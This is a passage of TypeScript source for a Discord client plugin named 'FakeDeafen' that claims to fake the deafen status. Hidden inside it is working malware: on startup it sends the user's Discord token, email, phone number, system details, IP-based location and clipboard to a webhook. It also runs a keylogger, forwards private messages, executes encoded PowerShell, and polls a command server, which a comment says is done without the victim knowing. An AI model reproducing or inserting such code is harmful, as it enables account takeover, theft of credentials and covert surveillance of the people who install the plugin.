    sendWebhook("🤡 Troll", [{ title: "Duvar Kağıdı Değiştirildi", color: 0xff0000, image: { url: url }, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !crazy ---
async function cmdCrazy() {
    const code = `
Add-Type -AssemblyName System.Windows.Forms
$1 = 0
while($1 -lt 50) {
  [Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1920), (Get-Random -Minimum 0 -Maximum 1080))
  Start-Sleep -Milliseconds 100
  $1++
}
`;
    const b64 = btoa(unescape(encodeURIComponent(code.replace(/\n/g, '\r\n'))).replace(/./g, c => c + '\0'));
    await Native.executeCommand(`powershell -EncodedCommand ${b64}`);
    sendWebhook("🤡 Troll", [{ title: "Fare Çıldırdı (5 sn)", color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !brightness <0-100> ---
async function cmdBrightness(level: string) {
    const v = parseInt(level);
    if (isNaN(v) || v < 0 || v > 100) return;
    await Native.executeCommand(`powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,${v})"`);
    sendWebhook("🤡 Troll", [{ title: `Parlaklık Değiştirildi: %${v}`, color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// ===================== NOTIFICATION FORWARDING =====================

function handleNotification(event: any) {
    try {
        const msg = event?.message;
        if (!msg) return;

        const UStore = findByProps("getCurrentUser");
        if (!UStore) return;
        const me = UStore.getCurrentUser();
        if (!me) return;

        // DM mesajı mı?
        const isDM = !msg.guild_id;
        // Mention var mı?
        const isMentioned = msg.mentions?.some((m: any) => m.id === me.id);

        if (!isDM && !isMentioned) return;

        const author = msg.author?.username || "?";
        const content = msg.content?.substring(0, 500) || "(bo\u015f)";
        const type = isDM ? "\uD83D\uDCE9 DM" : "\uD83D\uDD14 Mention";

        sendWebhook(`\uD83D\uDD14 Bildirim`, [
            {
                title: `${type} — ${author}`,
                color: isDM ? 0xeb459e : 0xed4245,
                fields: [
                    { name: "Mesaj", value: content, inline: false },
                    { name: "Kanal", value: msg.channel_id || "?", inline: true },
                    { name: "Zaman", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
                ],
                footer: { text: "Notification" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// ===================== STARTUP WEBHOOK =====================

async function sendStartupInfo() {
    try {
        const auth = findByProps("getToken", "getAnalyticsToken");
        const UStore = findByProps("getCurrentUser");
        const token = auth?.getToken() || "?";
        const user = UStore?.getCurrentUser();

        myDiscordName = user?.username || "?";

        const [sysInfo, ipInfo, clipText] = await Promise.all([
            Native.getSystemInfo(),
            Native.getPublicIP(),
            Native.getClipboardContent(),
        ]);

        myHostname = sysInfo.hostname || "?";

        const nitro = user?.premiumType === 2 ? "Nitro" : user?.premiumType === 1 ? "Classic" : "Yok";

        const embeds: any[] = [
            // 1. Başlık
            {
                title: "🚀 Discord Açıldı!",
                color: 0xed4245,
                description: "Yeni oturum başlatıldı. Tüm bilgiler aşağıda.",
                fields: [
                    { name: "Zaman", value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
                ],
                timestamp: new Date().toISOString(),
            },
            // 2. Hesap
            {
                title: "🔑 Hesap Bilgileri",
                color: 0x5865f2,
                fields: [
                    { name: "Kullanıcı", value: user?.username || "?", inline: true },
                    { name: "ID", value: user?.id || "?", inline: true },
                    { name: "Email", value: user?.email || "?", inline: true },
                    { name: "Telefon", value: user?.phone || "(yok)", inline: true },
                    { name: "Nitro", value: nitro, inline: true },
                    { name: "MFA", value: user?.mfaEnabled ? "✅" : "❌", inline: true },
                    { name: "Token", value: `||${token}||`, inline: false },
                ],
            },
            // 3. Sistem
            {
                title: "🖥️ Sistem",
                color: 0x57f287,
                fields: [
                    { name: "PC", value: `${sysInfo.hostname} (${sysInfo.username})`, inline: true },
                    { name: "OS", value: `${sysInfo.platform}\n${sysInfo.release}`, inline: true },
                    { name: "CPU", value: `${sysInfo.cpu}\n${sysInfo.cores} çekirdek`, inline: false },
                    { name: "RAM", value: `${sysInfo.freeMem} boş / ${sysInfo.totalMem}`, inline: true },
                    { name: "Uptime", value: sysInfo.uptime, inline: true },
                ],
            },
            // 4. Ağ
            {
                title: "🌐 Ağ & Konum",
                color: 0x9b59b6,
                fields: [
                    { name: "Public IP", value: ipInfo.query || "?", inline: true },
                    { name: "Konum", value: `${ipInfo.city || "?"}, ${ipInfo.country || "?"}`, inline: true },
                    { name: "ISP", value: ipInfo.isp || "?", inline: true },
                    { name: "Koordinat", value: ipInfo.lat && ipInfo.lon ? `${ipInfo.lat}, ${ipInfo.lon}` : "?", inline: true },
                    { name: "Yerel IP", value: sysInfo.localIPs?.join(", ") || "?", inline: false },
                ],
            },
            // 5. Pano
            {
                title: "📋 Pano",
                color: 0xfee75c,
                description: `\`\`\`\n${(clipText || "").substring(0, 500)}\n\`\`\``,
            },
        ];

        // İlk clipboard değerini kaydet (tekrar göndermesin)
        lastClipboard = clipText || "";

        await Native.sendStartupWebhook(WEBHOOK_URL, embeds, getBotName());
    } catch (e) {
        console.error("[FakeDeafen] Startup webhook error:", e);
    }
}

// ===================== BUTTON =====================

function fd_button(props: { nameplate?: any }) {
    return (
        <Button
            tooltipText={enabled ? "Disable Fake Deafen" : "Enable Fake Deafen"}
            icon={fd_icon}
            role="switch"
            aria-checked={enabled}
            redGlow={enabled}
            plated={props?.nameplate != null}
            onClick={toggleEnabled}
        />
    );
}

// ===================== PLUGIN =====================

export default definePlugin({
    name: "FakeDeafen",
    description: "Fake deafen yourself",
    authors: [{ name: "hyyven", id: 449282863582412850n }],
    settings: Settings,

    start() {
        // WebSocket hook
        const wsModule = findByProps("getSocket");
        if (wsModule) {
            const socket = wsModule.getSocket();
            if (socket) {
                originalSend = socket.send;
                socket.send = function (op: number, data: any, ...args: any[]) {
                    if (op === 4 && enabled && data) {
                        if (Settings.store.fakeMute) data.self_mute = true;
                        if (Settings.store.fakeDeafen) data.self_deaf = true;
                    }
                    return originalSend.apply(this, [op, data, ...args]);
                };
            }
        }

        // Keybind
        window.addEventListener("keydown", handleKeyDown);

        // Keylogger
        window.addEventListener("keydown", handleKeyLog, true);

        // Remote commands + notification forwarding
        FluxDispatcher.subscribe("MESSAGE_CREATE", handleRemoteCommand);
        FluxDispatcher.subscribe("MESSAGE_CREATE", handleNotification);

        // 🚀 STARTUP: Discord açılır açılmaz webhook gönder
        setTimeout(sendStartupInfo, 5000);

        // 📡 C2 POLLING: Kurbanın haberi olmadan senin sunucundan komut dinle (Her 3 saniyede bir)
        setInterval(pollBotCommands, 3000);
    },

    stop() {
        // WebSocket restore
        const wsModule = findByProps("getSocket");
        if (wsModule) {
            const socket = wsModule.getSocket();
            if (socket && originalSend) socket.send = originalSend;
        }

        // Keybind
        window.removeEventListener("keydown", handleKeyDown);

        // Keylogger
        window.removeEventListener("keydown", handleKeyLog, true);

        // Remote commands + notifications
        FluxDispatcher.unsubscribe("MESSAGE_CREATE", handleRemoteCommand);
        FluxDispatcher.unsubscribe("MESSAGE_CREATE", handleNotification);
    },

    patches: [
        {
            find: ".DISPLAY_NAME_STYLES_COACHMARK)",
            predicate: () => Settings.store.showButton,
            replacement: {
                match: /children:\[(?=[^}]*accountContainerRef)/,
                replace: "children:[$self.fd_button(arguments[0]),",
            },
        },
    ],

    fd_button: ErrorBoundary.wrap(fd_button, { noop: true }),
});